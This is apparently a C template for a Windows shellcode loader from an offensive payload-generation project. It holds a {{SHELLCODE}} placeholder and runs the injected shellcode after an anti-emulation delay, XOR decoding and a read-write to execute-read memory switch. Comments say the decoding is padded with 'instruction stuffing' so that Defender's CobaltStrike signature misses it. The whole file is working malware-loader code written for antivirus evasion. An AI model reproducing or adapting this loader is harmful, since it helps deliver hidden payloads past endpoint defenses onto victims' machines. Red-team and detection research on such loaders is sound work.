#include <windows.h>
#include <stdio.h>


// https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
int get_time_raw() {
    ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
    return kernelTime;
}

int sleep_ms(DWORD sleeptime) {
    DWORD start = get_time_raw();
    while (get_time_raw() - start < sleeptime) {}
}

void antiemulation() {
    sleep_ms(3000);
}



// Simple XOR will be detected as : 
//   https://defendersearch.r00ted.ch/threat?name=Trojan%3AWin64%2FCobaltStrike.JU%21MTB
void xor_cipher(char *ciphertext, size_t ciphertext_len, const char *key, size_t key_len) {
    int instruction_stuffing = 0;
    if (key_len == 0) return;  // prevent division by zero

    for (size_t i = 0; i < ciphertext_len; ++i) {
        instruction_stuffing += key_len * i;
        ciphertext[i] ^= key[i % key_len];
    }

    if (instruction_stuffing == 0) {
        printf("Nothing");
    }
}


int main(void)
{
	DWORD result;
	{{SHELLCODE}}

    antiemulation();

	// Allocate memory for the shellcode RW
    char *dest = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, PAGE_READWRITE);
	if (dest == NULL) {
		return 1;
	}

	// Copy the shellcode to the allocated memory
	memcpy(dest, shellcode, sizeof(shellcode));

	// Decode the shellcode
	xor_cipher((char *) dest, sizeof(shellcode), xorkey, strlen(xorkey));

	// Change memory protection to RX
	if (VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE_READ, &result) == 0) {
		return 2;
	}

    // Execute *dest
    (*(void(*)())(dest))();
	
	return 0;
}
